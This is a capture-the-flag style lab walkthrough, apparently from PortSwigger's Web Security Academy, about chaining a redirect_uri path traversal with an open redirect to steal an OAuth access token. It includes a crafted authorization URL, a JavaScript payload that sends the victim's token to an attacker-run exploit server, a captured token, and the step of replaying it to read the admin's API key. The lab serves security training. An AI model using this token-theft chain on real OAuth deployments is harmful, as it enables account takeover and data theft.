Title: Stealing OAuth access tokens via an open redirect
Level: PRACTITIONER
Desc:  This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.
To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.
Note: You cannot access the admin's API key by simply logging in to their account on the client application.
The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
You can log in via your own social media account using the following credentials: wiener:peter. 

# Walkthrough:

I' ve found Open Redirection in Comment section for post:
<img width="1602" height="890" alt="image" src="https://github.com/user-attachments/assets/136b12a3-a845-4028-ac29-ac3373b27d34" />
`https://0adc00b4048ce3eb80a0716d009e00f2.web-security-academy.net/post/next?path=/post?postId=3`

It also works like that: `https://0adc00b4048ce3eb80a0716d009e00f2.web-security-academy.net/post/next?path=https://HOSTNAME/`

During authentication client app make call to /me on ouath server:
<img width="1271" height="380" alt="image" src="https://github.com/user-attachments/assets/25b52b41-5a1e-4e1e-acda-8725647b1557" />
<img width="1266" height="442" alt="image" src="https://github.com/user-attachments/assets/030cf186-20ba-4fa9-a3d1-40e699153561" />

I am getting the most recent request for `/auth?client_id=ym7ii3q96xkkr2ywwnrcp&redirect_uri=https://0adc00b4048ce3eb80a0716d009e00f2.web-security-academy.net/oauth-callback&response_type=token&nonce=1259639818&scope=openid%20profile%20email`.
It is possible to inject into redirect_uri characters like that: /../../ (path traversal)

So, we have 2 vulnerabilities:
- path traversal in OpenAPI request
- open redirect in post page
We can combine this 2.

`https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`

`https://oauth-0ad2006a0452e3cc80d86f9902d100fc.oauth-server.net/auth?client_id=ym7ii3q96xkkr2ywwnrcp&redirect_uri=https://0adc00b4048ce3eb80a0716d009e00f2.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a1300120474e3a18037702b01bc0032.exploit-server.net/exploit&response_type=token&nonce=1259639818&scope=openid%20profile%20email `    
It redirects me to my exploit server and in the same time it give access token in URL.

On the exploit server I place this code:
```
<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
```

Now I can get token from logs of the exploit server.

You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token.
```
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0ad2006a0452e3cc80d86f9902d100fc.oauth-server.net/auth?client_id=ym7ii3q96xkkr2ywwnrcp&redirect_uri=https://0adc00b4048ce3eb80a0716d009e00f2.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a1300120474e3a18037702b01bc0032.exploit-server.net/exploit&response_type=token&nonce=1259639818&scope=openid%20profile%20email'
} else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```
Store this on the exploit server.
Deliver to victim, get token from logs: /?access_token=zhO4wa8SXRNiNxyeahZEgqtwrgT6FPLGdOKFjbUz8as&expires_in=3600&token_type=Bearer&scope=o

In Repeater, go to the GET /me request and replace the token in the Authorization: Bearer header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key. 

<img width="1366" height="523" alt="image" src="https://github.com/user-attachments/assets/96d76de1-6a77-4c27-bccb-7faf662d1ef1" />





